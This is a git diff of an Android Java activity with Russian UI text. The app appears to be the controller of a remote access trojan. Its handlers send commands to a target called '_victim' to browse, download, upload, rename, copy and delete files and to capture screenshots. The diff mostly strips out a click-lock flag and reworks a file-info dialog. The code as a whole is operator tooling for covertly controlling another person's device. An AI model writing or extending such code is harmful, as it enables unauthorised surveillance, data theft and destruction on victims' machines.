@@ -39,7 +39,7 @@ public class FileManagerActivity extends AppCompatActivity {
 
     private ListView _filesListView;
     private ArrayList<String> _dirList;
-    public boolean isClicked;
+    //public boolean isClicked;
 
     private String _bufferPath; //для copy-paste файлов
     private String _bufferFile; //для copy-paste файлов
@@ -81,50 +81,32 @@ public class FileManagerActivity extends AppCompatActivity {
         _pasteButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    return;
-                }
                 pasteHandler();
             }
         });
         _updateButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    return;
-                }
                 send_getFiles();
             }
         });
         _backButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    return;
-                }
                 if (_dirList.size() == 0){
                     MainActivity.getInstance().showText("Это корневая папка!");
                     return;
                 }
                 removeLastFile();
                 send_getFiles();
-                isClicked = false;
             }
         });
         _filesListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
             @Override
             public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    return;
-                }
                 String dir = ((TextView) view).getText().toString();
                 _dirList.add(dir);
                 send_getFiles();
-                isClicked = false;
             }
         });
     }
@@ -134,8 +116,6 @@ public class FileManagerActivity extends AppCompatActivity {
     }
 
     public void initFilesList(JSONArray files) {
-        isClicked = true;
-
         // TODO: 14.07.2017 добавить обработку недоступных директорий
         /*if (files[0].equals("not exists")) {
             Toast.makeText(this, "Неверная директория!", Toast.LENGTH_LONG).show();
@@ -158,8 +138,11 @@ public class FileManagerActivity extends AppCompatActivity {
         _filesListView.setAdapter(adapter);
     }
 
-    public void initFileInfo(String fullPath, long size, String lastModified) {
-        isClicked = true;
+    public void initFileInfo(String victim, JSONObject info) {
+        String fullPath = (String) info.get("fullPath");
+        long size = (long) info.get("size");
+        String lastModified = (String) info.get("lastModifiedTime");
+
         LayoutInflater layoutInflater = LayoutInflater.from(this);
         final View infoView = layoutInflater.inflate(R.layout.view_fileinfo, null);
 
@@ -171,7 +154,7 @@ public class FileManagerActivity extends AppCompatActivity {
         TextView lastModifedTextView = (TextView) infoView.findViewById(R.id.lastModifiedTextView);
 
         fullPathTextView.setText("Путь: " + fullPath);
-        sizeTextView.setText("Размер: " + size + " байт");
+        sizeTextView.setText("Размер: " + getPatternFileSize(size));
         lastModifedTextView.setText("Последнее изменение: " + lastModified);
 
         alertDialogBuilder.setCancelable(false);
@@ -193,6 +176,13 @@ public class FileManagerActivity extends AppCompatActivity {
         alertDialogBuilder.show();
     }
 
+    private String getPatternFileSize(long bytes) {
+        String pattern = bytes + " байт";
+        if (bytes >= 1024) pattern = (bytes / 1024) + " КБ";
+        if (bytes >= 1024*1024) pattern = (bytes / (1024*1024)) + " МБ";
+        return pattern;
+    }
+
     public void clearBuffer() {
         _bufferPath = "";
         _bufferFile = "";
@@ -210,11 +200,6 @@ public class FileManagerActivity extends AppCompatActivity {
     FileOutputStream _fileOutputStream;
     @Override
     public boolean onContextItemSelected(MenuItem item) {
-        if (!isClicked) {
-            MainActivity.getInstance().showText("Клики не доступны!");
-            return false;
-        }
-
         AdapterView.AdapterContextMenuInfo info = (AdapterView.AdapterContextMenuInfo) item.getMenuInfo();
         final String path = genDir() + ((TextView)info.targetView).getText();
 
@@ -225,11 +210,9 @@ public class FileManagerActivity extends AppCompatActivity {
             case "Скачать":
                 _downloadFilename = ((TextView)info.targetView).getText() + "";
                 nettyClient.sendStartDownloadFile(_victim, path, Config.DOWNLOAD_PATH);
-                isClicked = false;
                 break;
             case "Информация":
                 nettyClient.sendGetFileInfo(_victim, path);
-                isClicked = false;
                 break;
             case "Переименовать":
                 /* LayoutInflater – это класс, который умеет из содержимого layout-файла создать View-элемент.
@@ -251,7 +234,6 @@ public class FileManagerActivity extends AppCompatActivity {
                         String newPath = genDir() + newName;
 
                         NettyClient.getInstance().sendRenameFile(_victim, path, newPath);
-                        isClicked = false;
                     }
                 });
 
@@ -272,7 +254,6 @@ public class FileManagerActivity extends AppCompatActivity {
                 break;
             case "Удалить":
                 nettyClient.sendDeleteFile(_victim, path);
-                isClicked = false;
                 break;
         }
 
@@ -326,42 +307,21 @@ public class FileManagerActivity extends AppCompatActivity {
                 alertDialogBuilder.show();
                 break;
             case "Вставить":
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    break;
-                }
                 pasteHandler();
                 break;
             case "Обновить":
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    break;
-                }
                 send_getFiles();
                 break;
             case "Закачать":
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    break;
-                }
-
                 OpenFileDialog fileDialog = new OpenFileDialog(this, _victim, genDir());
                 fileDialog.show();
 
                 MainActivity.getInstance().showText("Выберите файл для выгрузки.");
                 break;
             case "Сохранить screen":
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    break;
-                }
                 NettyClient.getInstance().sendTakeScreen(_victim, genDir());
                 break;
             case "Назад":
-                if (!isClicked) {
-                    MainActivity.getInstance().showText("Клики не доступны!");
-                    break;
-                }
                 if (_dirList.size() == 0){
                     MainActivity.getInstance().showText("Это корневая папка!");
                     break;
@@ -369,7 +329,6 @@ public class FileManagerActivity extends AppCompatActivity {
 
                 removeLastFile();
                 send_getFiles();
-                isClicked = false;
                 break;
         }
         return true;
@@ -387,7 +346,6 @@ public class FileManagerActivity extends AppCompatActivity {
         }
 
         NettyClient.getInstance().sendCopyFile(_victim, _bufferPath, genDir()+_bufferFile);
-        isClicked = false;
     }
 
     private String genDir() {
